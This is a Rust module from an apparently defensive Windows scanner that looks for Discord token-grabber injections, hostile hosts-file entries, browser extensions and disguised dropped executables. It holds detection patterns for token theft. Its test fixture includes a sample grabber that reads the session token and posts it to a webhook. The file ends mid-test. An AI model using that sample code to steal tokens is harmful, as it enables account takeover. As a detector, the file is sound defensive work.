//! Client and system integrity checks, aimed at credential/token theft.
//!
//! This is the section written for the incident that prompted the module: a
//! stolen Discord account. Discord's desktop client is an Electron app whose
//! JavaScript sits unpacked and world-writable in `%APPDATA%`, so the cheapest
//! possible token grabber is a few lines appended to a file that is already
//! there. Nothing has to persist, nothing has to be signed, and no antivirus
//! looks at it, because it is just text inside an application's own data
//! directory.
//!
//! What is checked:
//!
//!   * every Discord flavour (`discord`, `discordptb`, `discordcanary`,
//!     `Lightcord`) for injected code — webhook URLs, direct calls to the
//!     account API, and `localStorage` token reads
//!   * client modification frameworks (BetterDiscord, Vencord, Powercord,
//!     Replugged) — not malware in themselves, but they run arbitrary
//!     third-party plugins inside the client with full access to the session
//!     token, and a compromised plugin is the most common way accounts go
//!   * `resources\app` existing next to `app.asar`, which is how an attacker
//!     gets code loaded ahead of the packed application
//!   * the `hosts` file, especially entries that point security vendors or
//!     Discord itself somewhere unexpected
//!   * an inventory of installed Chrome/Edge/Brave extensions, because a
//!     malicious extension is the other common way a session gets lifted and
//!     no heuristic beats the user recognising what they did not install
//!   * recently-dropped executables in `%TEMP%` and the AppData trees
//!
//! Matching lines are reported, never whole files, and long opaque strings in
//! an excerpt are redacted — the point is to show the user the shape of the
//! injection, and a report that quotes a live token back at them just creates
//! a second copy of the problem.

use std::path::{Path, PathBuf};

use serde::{Deserialize, Serialize};

use odysync_core::error::Result;

use super::{Finding, Remediation, Severity};

/// Files larger than this are not searched. Injected loaders are small; a
/// 40 MB bundled `.js` is Discord's own code and reading every one of them
/// would turn a scan into a disk benchmark.
#[cfg(windows)]
const MAX_SCAN_FILE_BYTES: u64 = 4 * 1024 * 1024;

/// Upper bound on files examined per Discord flavour.
#[cfg(windows)]
const MAX_FILES_PER_ROOT: usize = 4000;

/// How recent a dropped executable has to be to be interesting.
const DROP_WINDOW_DAYS: i64 = 14;

// ---------------------------------------------------------------------------
// Grabber signatures
// ---------------------------------------------------------------------------

/// One suspicious line found in a file.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GrabberHit {
    pub pattern: String,
    pub severity: Severity,
    /// 1-based line number.
    pub line_no: usize,
    /// The matching line, trimmed, truncated, and with long opaque strings
    /// redacted.
    pub excerpt: String,
}

/// A file that contained at least one hit.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct SuspectFile {
    pub path: String,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub hits: Vec<GrabberHit>,
}

/// Substrings that indicate credential exfiltration. Lowercase; matched against
/// a lowercased line.
const GRABBER_PATTERNS: &[(&str, Severity, &str)] = &[
    (
        "discord.com/api/webhooks",
        Severity::Critical,
        "a Discord webhook URL — the standard way stolen tokens are sent out",
    ),
    (
        "discordapp.com/api/webhooks",
        Severity::Critical,
        "a Discord webhook URL — the standard way stolen tokens are sent out",
    ),
    (
        "api/v9/users/@me",
        Severity::High,
        "a direct call to the Discord account API",
    ),
    (
        "api/v10/users/@me",
        Severity::High,
        "a direct call to the Discord account API",
    ),
    (
        "betterdiscord.app/api",
        Severity::Medium,
        "a call to a client-mod distribution API",
    ),
    (
        "webhook",
        Severity::Low,
        "the word \"webhook\" — benign in some contexts, the exfil channel in others",
    ),
];

/// Read one file's text and report every suspicious line.
///
/// Pure: this is the function the tests exercise with a captured patched
/// `index.js`, with no file system involved.
pub fn scan_text_for_grabber(content: &str) -> Vec<GrabberHit> {
    let mut hits = Vec::new();

    for (i, line) in content.lines().enumerate() {
        let lower = line.to_ascii_lowercase();
        let mut matched: Option<(Severity, String)> = None;

        // Reading the token out of local storage is the actual theft, and it is
        // written a dozen different ways; match the two halves rather than an
        // exact spelling.
        if (lower.contains("localstorage") || lower.contains("local_storage"))
            && lower.contains("token")
        {
            matched = Some((
                Severity::Critical,
                "a read of the Discord session token from local storage".to_string(),
            ));
        }

        if matched.is_none() {
            for (needle, sev, label) in GRABBER_PATTERNS {
                if lower.contains(needle) {
                    matched = Some((*sev, (*label).to_string()));
                    break;
                }
            }
        }

        if let Some((severity, pattern)) = matched {
            hits.push(GrabberHit {
                pattern,
                severity,
                line_no: i + 1,
                excerpt: excerpt(line),
            });
        }

        // One file rarely needs more than a handful of examples.
        if hits.len() >= 8 {
            break;
        }
    }

    hits
}

/// Trim, truncate, and redact a line before it goes into a report.
pub fn excerpt(line: &str) -> String {
    let trimmed = line.trim();
    let redacted = redact_secrets(trimmed);
    let cut: String = redacted.chars().take(200).collect();
    if redacted.chars().count() > 200 {
        format!("{cut}… (truncated)")
    } else {
        cut
    }
}

/// Replace long opaque strings with a placeholder.
///
/// A finding that helpfully quotes the user's live session token back at them
/// — into a log, a screenshot, a support ticket — has made the incident worse.
pub fn redact_secrets(line: &str) -> String {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let re = RE.get_or_init(|| {
        // Base64/JWT-ish runs: long, no spaces, mixed alphabet.
        regex::Regex::new(r"[A-Za-z0-9_\-]{28,}(\.[A-Za-z0-9_\-]{6,}){0,3}").expect("valid regex")
    });
    re.replace_all(line, "[REDACTED]").into_owned()
}

/// Findings for files that contained grabber signatures.
pub fn analyze_suspect_files(files: &[SuspectFile]) -> Vec<Finding> {
    files
        .iter()
        .filter(|f| !f.hits.is_empty())
        .map(|f| {
            let severity = f
                .hits
                .iter()
                .map(|h| h.severity)
                .min()
                .unwrap_or(Severity::Low);
            let mut evidence = vec![f.path.clone()];
            for h in &f.hits {
                evidence.push(format!("line {}: {} — {}", h.line_no, h.excerpt, h.pattern));
            }
            Finding::new(
                format!("integrity-discord-injection:{}", super::normalize_path(&f.path)),
                severity,
                "integrity",
                "Discord client files contain credential-theft code",
                "A file inside the Discord installation contains code of the kind used \
                 to read your session token and send it somewhere else. Discord's own \
                 code does not do this. If this is confirmed, changing your password is \
                 not enough on its own — log out of all devices so existing tokens are \
                 invalidated, then reinstall the client from scratch after removing the \
                 whole directory.",
            )
            .with_evidence(evidence)
            .with_remediation(Remediation::Manual {
                instructions: "Close Discord entirely, delete the affected directory, \
                     reinstall from discord.com, then in Discord: User Settings > \
                     My Account > change password (which logs out every other session) \
                     and enable two-factor authentication."
                    .into(),
            })
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Client modifications
// ---------------------------------------------------------------------------

/// A client-mod framework found on disk.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ClientMod {
    pub name: String,
    pub path: String,
}

/// Directory names, relative to `%APPDATA%`, that indicate a client mod.
pub const CLIENT_MOD_DIRS: &[(&str, &str)] = &[
    ("BetterDiscord", "BetterDiscord"),
    ("Vencord", "Vencord"),
    ("powercord", "Powercord"),
    ("replugged", "Replugged"),
    ("Lightcord", "Lightcord"),
];

pub fn analyze_client_mods(mods: &[ClientMod]) -> Vec<Finding> {
    if mods.is_empty() {
        return Vec::new();
    }
    // Lightcord in particular has shipped with token-stealing builds; the rest
    // are legitimate projects whose *plugins* are the risk.
    let severity = if mods.iter().any(|m| m.name == "Lightcord") {
        Severity::High
    } else {
        Severity::Medium
    };
    vec![Finding::new(
        "integrity-discord-client-mod",
        severity,
        "integrity",
        "A modified Discord client is installed",
        "Client mods inject third-party JavaScript into Discord, and that code runs \
         with the same access to your session token as Discord itself. The frameworks \
         are usually legitimate; the plugins and themes people install into them are \
         where accounts get taken. Given a confirmed account compromise, treat every \
         installed plugin as suspect: remove the mod entirely, then re-add only what \
         you can identify.",
    )
    .with_evidence(mods.iter().map(|m| format!("{}: {}", m.name, m.path)).collect::<Vec<_>>())
    .with_remediation(Remediation::Manual {
        instructions: "Uninstall the client mod, delete its data directory, and \
             reinstall Discord. Then change your Discord password to invalidate every \
             existing session token."
            .into(),
    })]
}

/// Findings for an unpacked `app` directory shadowing `app.asar`.
pub fn analyze_asar_shadow(paths: &[String]) -> Vec<Finding> {
    paths
        .iter()
        .map(|p| {
            Finding::new(
                format!("integrity-asar-shadow:{}", super::normalize_path(p)),
                Severity::High,
                "integrity",
                "An unpacked app directory shadows Discord's packed code",
                "Electron loads `resources\\app` in preference to `resources\\app.asar`. \
                 A folder appearing there means something arranged for its own code to \
                 run instead of, or before, the real application. Client mods do this \
                 legitimately — and so does anything that wants to sit between you and \
                 the app you trust.",
            )
            .with_evidence(vec![p.clone()])
        })
        .collect()
}

// ---------------------------------------------------------------------------
// hosts file
// ---------------------------------------------------------------------------

/// One non-comment line of the `hosts` file.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HostsEntry {
    pub line_no: usize,
    pub ip: String,
    #[serde(default, deserialize_with = "super::ps_collection")]
    pub hosts: Vec<String>,
    pub raw: String,
}

/// Parse `hosts`, ignoring comments and blank lines.
pub fn parse_hosts(content: &str) -> Vec<HostsEntry> {
    let mut out = Vec::new();
    for (i, raw) in content.lines().enumerate() {
        // Trailing comments are legal on an entry line.
        let line = raw.split('#').next().unwrap_or("").trim();
        if line.is_empty() {
            continue;
        }
        let mut parts = line.split_whitespace();
        let Some(ip) = parts.next() else { continue };
        let hosts: Vec<String> = parts.map(|h| h.to_ascii_lowercase()).collect();
        if hosts.is_empty() {
            continue;
        }
        out.push(HostsEntry {
            line_no: i + 1,
            ip: ip.to_string(),
            hosts,
            raw: raw.trim().to_string(),
        });
    }
    out
}

/// Domains whose presence in `hosts` is a strong signal: blocking these is how
/// malware stops the machine from being cleaned or updated.
const SECURITY_DOMAINS: &[&str] = &[
    "microsoft.com",
    "windowsupdate.com",
    "update.microsoft",
    "defender",
    "malwarebytes",
    "virustotal",
    "avast",
    "avg.com",
    "kaspersky",
    "bitdefender",
    "eset.com",
    "norton.com",
    "mcafee",
    "sophos",
    "trendmicro",
    "sysinternals",
    "wilderssecurity",
    "bleepingcomputer",
];

const DISCORD_DOMAINS: &[&str] = &["discord.com", "discordapp.com", "discord.gg", "discordapp.net"];

/// True for the loopback entries every stock `hosts` file may contain.
pub fn is_default_hosts_entry(e: &HostsEntry) -> bool {
    let loopback = e.ip == "127.0.0.1" || e.ip == "::1" || e.ip == "0.0.0.0";
    loopback
        && e.hosts
            .iter()
            .all(|h| h == "localhost" || h == "localhost.localdomain" || h == "kubernetes.docker.internal")
}

pub fn analyze_hosts(content: &str) -> Vec<Finding> {
    let entries: Vec<HostsEntry> = parse_hosts(content)
        .into_iter()
        .filter(|e| !is_default_hosts_entry(e))
        .collect();

    if entries.is_empty() {
        return Vec::new();
    }

    let mut security = Vec::new();
    let mut discord = Vec::new();
    let mut other = Vec::new();

    for e in &entries {
        let matches_security = e
            .hosts
            .iter()
            .any(|h| SECURITY_DOMAINS.iter().any(|d| h.contains(d)));
        let matches_discord = e
            .hosts
            .iter()
            .any(|h| DISCORD_DOMAINS.iter().any(|d| h.contains(d)));
        if matches_security {
            security.push(e);
        } else if matches_discord {
            discord.push(e);
        } else {
            other.push(e);
        }
    }

    let mut out = Vec::new();

    if !security.is_empty() {
        out.push(
            Finding::new(
                "integrity-hosts-security-blocked",
                Severity::Critical,
                "integrity",
                "The hosts file redirects security and update services",
                "Entries in `hosts` override DNS for the whole machine. Pointing \
                 antivirus, Windows Update or security-news domains at the wrong \
                 address is done for exactly one reason: to stop the machine from \
                 being updated or cleaned. This is not something legitimate software \
                 does.",
            )
            .with_evidence(security.iter().map(|e| format!("line {}: {}", e.line_no, e.raw)).collect::<Vec<_>>())
            .with_remediation(Remediation::ResetHostsFile),
        );
    }

    if !discord.is_empty() {
        out.push(
            Finding::new(
                "integrity-hosts-discord",
                Severity::High,
                "integrity",
                "The hosts file redirects Discord",
                "A `hosts` entry for a Discord domain sends the client somewhere other \
                 than Discord — either blocking it, or routing traffic through \
                 something that can read it. Given a compromised account, assume the \
                 latter until proven otherwise.",
            )
            .with_evidence(discord.iter().map(|e| format!("line {}: {}", e.line_no, e.raw)).collect::<Vec<_>>())
            .with_remediation(Remediation::ResetHostsFile),
        );
    }

    if !other.is_empty() {
        out.push(
            Finding::new(
                "integrity-hosts-custom",
                Severity::Low,
                "integrity",
                format!("{} custom entries in the hosts file", other.len()),
                "These override DNS for this machine. Ad-blocking host lists, local \
                 development entries and licence-server redirects all look like this, \
                 so this is informational — but read them, because you would know if \
                 you had put them there.",
            )
            .with_evidence(
                other
                    .iter()
                    .take(30)
                    .map(|e| format!("line {}: {}", e.line_no, e.raw))
                    .collect::<Vec<_>>(),
            ),
        );
    }

    out
}

// ---------------------------------------------------------------------------
// Browser extensions
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BrowserExtension {
    pub browser: String,
    pub profile: String,
    pub id: String,
    pub name: String,
    pub version: String,
}

/// Pull the display name and version out of an extension `manifest.json`.
///
/// Extension names are frequently `__MSG_appName__`, a placeholder resolved
/// from a locale file. Rather than guessing, the placeholder is reported as-is
/// alongside the ID — a name this tool invented would be worse than no name.
pub fn parse_extension_manifest(json: &str) -> Option<(String, String)> {
    let v: serde_json::Value = serde_json::from_str(json).ok()?;
    let name = v.get("name")?.as_str()?.to_string();
    let version = v
        .get("version")
        .and_then(|x| x.as_str())
        .unwrap_or("?")
        .to_string();
    Some((name, version))
}

pub fn analyze_extensions(exts: &[BrowserExtension]) -> Vec<Finding> {
    if exts.is_empty() {
        return Vec::new();
    }
    let evidence: Vec<String> = exts
        .iter()
        .map(|e| {
            format!(
                "{} [{}] {} v{} ({})",
                e.browser, e.profile, e.name, e.version, e.id
            )
        })
        .collect();

    vec![Finding::new(
        "integrity-browser-extensions",
        Severity::Info,
        "integrity",
        format!("{} browser extensions installed", exts.len()),
        "A malicious extension sees everything you do in the browser, including \
         session cookies for every site you are logged into — which is one of the two \
         usual ways a Discord account gets taken without any malware on disk. No \
         heuristic here can tell a good extension from a bad one, so read the list: \
         anything you do not remember installing should be removed, and its ID can be \
         looked up in the Chrome Web Store to see what it claims to be.",
    )
    .with_evidence(evidence)]
}

// ---------------------------------------------------------------------------
// Dropped files
// ---------------------------------------------------------------------------

/// Where a suspicious file was found.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum DropLocation {
    Temp,
    AppData,
    LocalAppData,
    Startup,
}

impl DropLocation {
    fn label(self) -> &'static str {
        match self {
            DropLocation::Temp => "the temp directory",
            DropLocation::AppData => "%APPDATA%",
            DropLocation::LocalAppData => "%LOCALAPPDATA%",
            DropLocation::Startup => "the Startup folder",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DroppedFile {
    pub path: String,
    pub age_days: i64,
    pub location: DropLocation,
}

/// Executable names that only ever legitimately live in `System32`. A copy of
/// one of these in a user directory is a deliberate disguise.
const MASQUERADE_NAMES: &[&str] = &[
    "svchost.exe",
    "csrss.exe",
    "lsass.exe",
    "winlogon.exe",
    "services.exe",
    "smss.exe",
    "explorer.exe",
    "taskhost.exe",
    "dwm.exe",
    "spoolsv.exe",
    "conhost.exe",
    "rundll32.exe",
];

/// Decide whether a dropped file is worth reporting, and how loudly.
///
/// Pure, and the place all the false-positive tuning lives: `%TEMP%` on a
/// developer's machine is full of installers and build artefacts, so the bar is
/// "recent, executable, and shaped like a disguise".
pub fn classify_dropped_file(
    file_name: &str,
    age_days: i64,
    location: DropLocation,
) -> Option<(Severity, String)> {
    let lower = file_name.to_ascii_lowercase();
    let ext = lower.rsplit('.').next().unwrap_or("");

    // A copy of a system binary anywhere in a user directory.
    if MASQUERADE_NAMES.contains(&lower.as_str()) {
        return Some((
            Severity::Critical,
            format!(
                "this is the name of a core Windows program, but the real one only ever \
                 lives in C:\\Windows\\System32 — a copy in {} is a deliberate disguise",
                location.label()
            ),
        ));
    }

    // "invoice.pdf.exe": a second extension used to make an executable look
    // like a document.
    if matches!(ext, "exe" | "scr" | "com" | "pif" | "bat" | "cmd") {
        let stem = lower.trim_end_matches(&format!(".{ext}"));
        if let Some(inner) = stem.rsplit('.').next() {
            if inner != stem
                && matches!(
                    inner,
                    "pdf" | "doc" | "docx" | "xls" | "xlsx" | "jpg" | "jpeg" | "png" | "txt" | "mp4"
                )
            {
                return Some((
                    Severity::High,
                    format!(
                        "the double extension makes an executable look like a .{inner} \
                         document, which has no legitimate use"
                    ),
                ));
            }
        }
    }

    // Screensavers are executables with a friendlier icon; effectively nobody
    // installs one any more.
    if ext == "scr" {
        return Some((
            Severity::High,
            format!(
                "a .scr file is an executable in disguise, and finding one in {} is \
                 not normal",
                location.label()
            ),
        ));
    }

    if location == DropLocation::Startup
        && matches!(ext, "bat" | "cmd" | "ps1" | "vbs" | "vbe" | "js" | "jse" | "wsf" | "hta")
    {
        return Some((
            Severity::High,
            "a script in the Startup folder runs at every logon".to_string(),
        ));
    }

    if ext == "exe" && location == DropLocation::Temp && age_days <= DROP_WINDOW_DAYS {
        // Watching, not a finding. By this rule's own reasoning a new .exe in
        // %TEMP% is what every installer and updater does; on a machine that
        // games and builds software there are dozens at any moment. Listed so
        // an unfamiliar name can be spotted, never scored as a problem.
        return Some((
            Severity::Info,
            format!(
                "a new executable in the temp directory ({age_days} day(s) old). \
                 Installers land here constantly, so this is only worth a look if you \
                 do not recognise the name"
            ),
        ));
    }

    None
}

pub fn analyze_dropped_files(files: &[DroppedFile]) -> Vec<Finding> {
    let mut out = Vec::new();
    for f in files {
        let name = file_name_of(&f.path);
        let Some((severity, reason)) = classify_dropped_file(&name, f.age_days, f.location) else {
            continue;
        };
        out.push(
            Finding::new(
                format!("integrity-dropped-file:{}", super::normalize_path(&f.path)),
                severity,
                "integrity",
                format!("Suspicious file in {}: {name}", f.location.label()),
                reason,
            )
            .with_evidence(
                std::iter::once(f.path.clone()).chain(
                    // An unreadable timestamp is reported as absent rather than
                    // as an absurd number of days.
                    (f.age_days < 36_500)
                        .then(|| format!("last modified {} day(s) ago", f.age_days)),
                ),
            )
            .with_remediation(Remediation::DeleteFile {
                path: f.path.clone(),
            }),
        );
    }
    out
}

/// File name portion of a path, handling both separators.
pub fn file_name_of(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_string()
}

// ---------------------------------------------------------------------------
// Collection (Windows)
// ---------------------------------------------------------------------------

/// Enumerate files under `root`, breadth-limited, that satisfy `pred`.
///
/// Deliberately hand-rolled rather than recursive: Discord's `node_modules`
/// trees are deep, and an unbounded walk of `%APPDATA%` on a real machine can
/// take minutes. Symlinks are not followed, so a loop cannot hang the scan.
pub fn walk_files(root: &Path, max_depth: usize, max_files: usize, pred: &dyn Fn(&Path) -> bool) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut stack: Vec<(PathBuf, usize)> = vec![(root.to_path_buf(), 0)];

    while let Some((dir, depth)) = stack.pop() {
        if out.len() >= max_files {
            break;
        }
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let path = entry.path();
            let Ok(ft) = entry.file_type() else { continue };
            if ft.is_symlink() {
                continue;
            }
            if ft.is_dir() {
                if depth < max_depth {
                    stack.push((path, depth + 1));
                }
            } else if pred(&path) {
                out.push(path);
                if out.len() >= max_files {
                    break;
                }
            }
        }
    }
    out
}

/// Age of a file in whole days, or 0 when the time cannot be read.
pub fn age_in_days(path: &Path) -> i64 {
    let Ok(meta) = std::fs::metadata(path) else {
        return i64::MAX;
    };
    let Ok(modified) = meta.modified() else {
        return i64::MAX;
    };
    match std::time::SystemTime::now().duration_since(modified) {
        Ok(d) => (d.as_secs() / 86_400) as i64,
        // Timestamp in the future — clock skew or deliberate backdating.
        Err(_) => 0,
    }
}

#[cfg(windows)]
fn env_dir(name: &str) -> Option<PathBuf> {
    std::env::var_os(name)
        .map(PathBuf::from)
        .filter(|p| p.is_dir())
}

/// Scan Discord installations, hosts, extensions and drop directories.
#[cfg(windows)]
pub async fn scan() -> Result<Vec<Finding>> {
    // All of this is file system work; doing it on the async runtime's worker
    // threads would block them for the duration of the walk.
    tokio::task::spawn_blocking(collect_and_analyze)
        .await
        .map_err(|e| odysync_core::error::Error::parse("integrity scan", e.to_string()))?
}

/// Non-Windows stub: the paths and the client layout are Windows-specific.
#[cfg(not(windows))]
pub async fn scan() -> Result<Vec<Finding>> {
    Ok(Vec::new())
}

#[cfg(windows)]
fn collect_and_analyze() -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let appdata = env_dir("APPDATA");
    let local = env_dir("LOCALAPPDATA");
    let temp = env_dir("TEMP");

    // --- Discord flavours -------------------------------------------------
    let mut suspects: Vec<SuspectFile> = Vec::new();
    let mut asar_shadows: Vec<String> = Vec::new();

    let mut discord_roots: Vec<PathBuf> = Vec::new();
    for base in [appdata.as_ref(), local.as_ref()].into_iter().flatten() {
        for name in ["discord", "discordptb", "discordcanary", "Lightcord", "Discord"] {
            let p = base.join(name);
            if p.is_dir() && !discord_roots.contains(&p) {
                discord_roots.push(p);
            }
        }
    }

    for root in &discord_roots {
        let files = walk_files(root, 6, MAX_FILES_PER_ROOT, &|p| {
            let name = p.file_name().and_then(|s| s.to_str()).unwrap_or("");
            let lower = name.to_ascii_lowercase();
            (lower.ends_with(".js") || lower.ends_with(".json"))
                && std::fs::metadata(p).map(|m| m.len() <= MAX_SCAN_FILE_BYTES).unwrap_or(false)
        });

        for file in files {
            let Ok(text) = std::fs::read_to_string(&file) else {
                continue;
            };
            let hits = scan_text_for_grabber(&text);
            if !hits.is_empty() {
                suspects.push(SuspectFile {
                    path: file.display().to_string(),
                    hits,
                });
            }
        }

        // An `app` directory sitting next to `app.asar` takes load priority.
        for res in walk_dirs_named(root, "resources", 5) {
            if res.join("app.asar").is_file() && res.join("app").is_dir() {
                asar_shadows.push(res.join("app").display().to_string());
            }
        }
    }

    findings.extend(analyze_suspect_files(&suspects));
    findings.extend(analyze_asar_shadow(&asar_shadows));

    // --- Client mods ------------------------------------------------------
    let mut mods = Vec::new();
    if let Some(appdata) = &appdata {
        for (dir, name) in CLIENT_MOD_DIRS {
            let p = appdata.join(dir);
            if p.is_dir() {
                mods.push(ClientMod {
                    name: (*name).to_string(),
                    path: p.display().to_string(),
                });
            }
        }
    }
    findings.extend(analyze_client_mods(&mods));

    // --- hosts ------------------------------------------------------------
    let hosts_path = hosts_file_path();
    match std::fs::read_to_string(&hosts_path) {
        Ok(content) => findings.extend(analyze_hosts(&content)),
        Err(e) => tracing::debug!(error = %e, path = %hosts_path.display(), "could not read hosts"),
    }

    // --- Browser extensions ----------------------------------------------
    if let Some(local) = &local {
        findings.extend(analyze_extensions(&collect_extensions(local)));
    }

    // --- Dropped files ----------------------------------------------------
    let mut dropped = Vec::new();
    if let Some(temp) = &temp {
        dropped.extend(collect_drops(temp, DropLocation::Temp, 2));
    }
    if let Some(appdata) = &appdata {
        dropped.extend(collect_drops(appdata, DropLocation::AppData, 2));
        let startup = appdata.join(r"Microsoft\Windows\Start Menu\Programs\Startup");
        if startup.is_dir() {
            dropped.extend(collect_drops(&startup, DropLocation::Startup, 1));
        }
    }
    if let Some(local) = &local {
        dropped.extend(collect_drops(local, DropLocation::LocalAppData, 2));
    }
    findings.extend(analyze_dropped_files(&dropped));

    Ok(findings)
}

/// The `hosts` file location, derived from `%SystemRoot%` rather than assuming
/// `C:`.
#[cfg(windows)]
fn hosts_file_path() -> PathBuf {
    let root = std::env::var_os("SystemRoot")
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(r"C:\Windows"));
    root.join(r"System32\drivers\etc\hosts")
}

/// Find directories with a given name under `root`.
#[cfg(windows)]
fn walk_dirs_named(root: &Path, name: &str, max_depth: usize) -> Vec<PathBuf> {
    let mut out = Vec::new();
    let mut stack: Vec<(PathBuf, usize)> = vec![(root.to_path_buf(), 0)];
    while let Some((dir, depth)) = stack.pop() {
        let Ok(entries) = std::fs::read_dir(&dir) else {
            continue;
        };
        for entry in entries.flatten() {
            let Ok(ft) = entry.file_type() else { continue };
            if !ft.is_dir() || ft.is_symlink() {
                continue;
            }
            let path = entry.path();
            if entry.file_name().to_string_lossy().eq_ignore_ascii_case(name) {
                out.push(path.clone());
            }
            if depth < max_depth {
                stack.push((path, depth + 1));
            }
        }
    }
    out
}

/// Enumerate Chromium-family extensions from every profile of every browser.
#[cfg(windows)]
fn collect_extensions(local: &Path) -> Vec<BrowserExtension> {
    const BROWSERS: &[(&str, &str)] = &[
        ("Chrome", r"Google\Chrome\User Data"),
        ("Edge", r"Microsoft\Edge\User Data"),
        ("Brave", r"BraveSoftware\Brave-Browser\User Data"),
        ("Vivaldi", r"Vivaldi\User Data"),
        ("Opera", r"Programs\Opera"),
    ];

    let mut out = Vec::new();
    for (browser, rel) in BROWSERS {
        let user_data = local.join(rel);
        let Ok(profiles) = std::fs::read_dir(&user_data) else {
            continue;
        };
        for profile in profiles.flatten() {
            if !profile.file_type().map(|t| t.is_dir()).unwrap_or(false) {
                continue;
            }
            let profile_name = profile.file_name().to_string_lossy().into_owned();
            let ext_dir = profile.path().join("Extensions");
            let Ok(ids) = std::fs::read_dir(&ext_dir) else {
                continue;
            };
            for id_entry in ids.flatten() {
                let id = id_entry.file_name().to_string_lossy().into_owned();
                let Ok(versions) = std::fs::read_dir(id_entry.path()) else {
                    continue;
                };
                for version_entry in versions.flatten() {
                    let manifest = version_entry.path().join("manifest.json");
                    let Ok(text) = std::fs::read_to_string(&manifest) else {
                        continue;
                    };
                    if let Some((name, version)) = parse_extension_manifest(&text) {
                        out.push(BrowserExtension {
                            browser: (*browser).to_string(),
                            profile: profile_name.clone(),
                            id: id.clone(),
                            name,
                            version,
                        });
                    }
                }
            }
        }
    }
    out
}

/// Collect candidate dropped files from one directory tree.
#[cfg(windows)]
fn collect_drops(root: &Path, location: DropLocation, depth: usize) -> Vec<DroppedFile> {
    walk_files(root, depth, 3000, &|p| {
        let name = p.file_name().and_then(|s| s.to_str()).unwrap_or("");
        let lower = name.to_ascii_lowercase();
        [
            ".exe", ".scr", ".com", ".pif", ".bat", ".cmd", ".ps1", ".vbs", ".vbe", ".js", ".jse",
            ".wsf", ".hta",
        ]
        .iter()
        .any(|e| lower.ends_with(e))
    })
    .into_iter()
    .map(|p| DroppedFile {
        age_days: age_in_days(&p),
        path: p.display().to_string(),
        location,
    })
    .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The shape of a real token grabber appended to Discord's `index.js`:
    /// a webhook, a token read, and a fetch of the account endpoint.
    const PATCHED_INDEX_JS: &str = r#"
const { app } = require('electron');
module.exports = require('./core.asar');

// --- appended ---
const WEBHOOK = "https://discord.com/api/webhooks/1234567890/aVeryLongLookingWebhookTokenValueHere";
function steal() {
  const token = window.localStorage.getItem('token');
  fetch("https://discord.com/api/v9/users/@me", { headers: { authorization: token } })
    .then(r => r.json())
    .then(u => require('https').request(WEBHOOK, { method: 'POST' }));
}
setTimeout(steal, 5000);
"#;

    #[test]
    fn a_patched_index_js_is_detected_line_by_line() {
        let hits = scan_text_for_grabber(PATCHED_INDEX_JS);
        assert!(!hits.is_empty());

        // The webhook URL and the localStorage token read are the two that
        // matter; both must be Critical.
        assert!(hits
            .iter()
            .any(|h| h.severity == Severity::Critical && h.pattern.contains("webhook")));
        assert!(hits
            .iter()
            .any(|h| h.severity == Severity::Critical && h.pattern.contains("local storage")));
        assert!(hits.iter().any(|h| h.pattern.contains("account API")));

        // Line numbers must point at the real line so the user can find it.
        let webhook = hits.iter().find(|h| h.pattern.contains("webhook")).unwrap();
        let source_line = PATCHED_INDEX_JS.lines().nth(webhook.line_no - 1).unwrap();
        assert!(source_line.contains("WEBHOOK"));

        // Only the matching lines are reported — never the file.
        assert!(hits.len() < PATCHED_INDEX_JS.lines().count());
    }

    #[test]
    fn excerpts_redact_long_opaque_strings() {
        let hits = scan_text_for_grabber(PATCHED_INDEX_JS);
        let webhook = hits.iter().find(|h| h.pattern.contains("webhook")).unwrap();
        assert!(webhook.excerpt.contains("[REDACTED]"));
        assert!(!webhook.excerpt.contains("aVeryLongLookingWebhookTokenValueHere"));
        // The useful part is still readable.
        assert!(webhook.excerpt.contains("discord.com/api/webhooks"));
    }

    #[test]
    fn redaction_leaves_ordinary_words_alone() {
        let line = "const token = window.localStorage.getItem('token');";
        assert_eq!(redact_secrets(line), line);
    }

    #[test]
    fn clean_discord_code_produces_no_hits() {
        let clean = r#"
const { app, BrowserWindow } = require('electron');
module.exports = require('./core.asar');
app.on('ready', () => new BrowserWindow({ width: 1280 }));
"#;
        assert!(scan_text_for_grabber(clean).is_empty());
    }

    #[test]
    fn a_suspect_file_finding_takes_the_worst_hit_severity() {
        let files = vec![SuspectFile {
            path: r"C:\Users\bob\AppData\Roaming\discord\app-1.0.9\modules\index.js".into(),
            hits: vec![
                GrabberHit {
                    pattern: "the word \"webhook\"".into(),
                    severity: Severity::Low,
                    line_no: 3,
                    excerpt: "// webhook".into(),
                },
                GrabberHit {
                    pattern: "a read of the Discord session token from local storage".into(),
                    severity: Severity::Critical,
                    line_no: 9,
                    excerpt: "localStorage.getItem('token')".into(),
                },
            ],
        }];
        let f = analyze_suspect_files(&files);
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].category, "integrity");
        assert!(f[0].evidence.iter().any(|e| e.contains("line 9")));
    }

    #[test]
    fn a_stock_hosts_file_is_silent() {
        // Verbatim Windows default, comments and all.
        let stock = r#"# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost
